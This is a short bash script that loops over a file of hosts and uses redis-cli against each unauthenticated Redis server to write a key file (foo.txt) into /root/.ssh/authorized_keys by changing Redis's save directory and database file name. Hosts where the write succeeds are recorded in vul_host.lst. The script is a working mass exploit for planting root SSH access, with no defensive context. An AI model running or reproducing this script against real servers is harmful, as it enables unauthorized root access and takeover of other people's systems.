#!/bin/bash

read -p "enter the filename which contains urls\n" urlfile
cat $urlfile | while read line
do
	cat foo.txt |redis-cli -h $line -x set crackit \
		&& redis-cli -h $line config set dir /root/.ssh/ |grep OK \
		&& redis-cli -h $line config get dir|grep '/root/.ssh' \
		&& redis-cli -h $line config set dbfilename \
		"authorized_keys" | grep OK && redis-cli -h $line save \
	| grep OK && echo "$line is OK" &&  echo $line >> vul_host.lst
done

echo "program exit"
